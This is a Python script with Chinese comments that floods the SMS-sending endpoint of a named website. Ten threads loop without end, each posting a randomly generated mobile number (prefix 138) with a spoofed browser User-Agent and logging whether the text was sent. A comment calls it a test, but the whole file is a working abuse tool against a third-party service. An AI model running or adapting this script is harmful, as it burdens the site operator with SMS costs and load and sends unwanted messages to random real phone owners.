import http.client as http
import urllib
import random
import math
import threading


# 测试的服务器 + 端口 （有些大网站会认定你是攻击并且重置你的请求，比如baidu.com）
SERVER_NAME = "www.langsspt.com"
# 访问的页面
URL = '/index.php/Index/msgSend'


class MessageThread(threading.Thread):
    def __init__(self, thread_name):
        threading.Thread.__init__(self)

    def run(self):
        begin_connect()


def begin_connect():
    while True:
        phone = '138'
        while len(phone) < 11:
            phone += str(math.floor(random.random() * 10))
        test_start(phone)


def test_start(phone):
    test_data = {'phone': phone}
    test_data_encode = urllib.parse.urlencode(test_data)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    conn = http.HTTPConnection(SERVER_NAME)
    conn.request("POST", URL, test_data_encode, headers)
    res = conn.getresponse()
    if res.status == 200:
        res_body = res.read()
        if '1' in str(res_body):
            print(test_data_encode, '短信发送成功')
        else:
            print(test_data_encode, '短信发送失败')
    else:
        print('status:', res.status)
    conn.close()

i = 0
while i < 10:
    t = MessageThread("thread" + str(i))
    t.start()
    i += 1
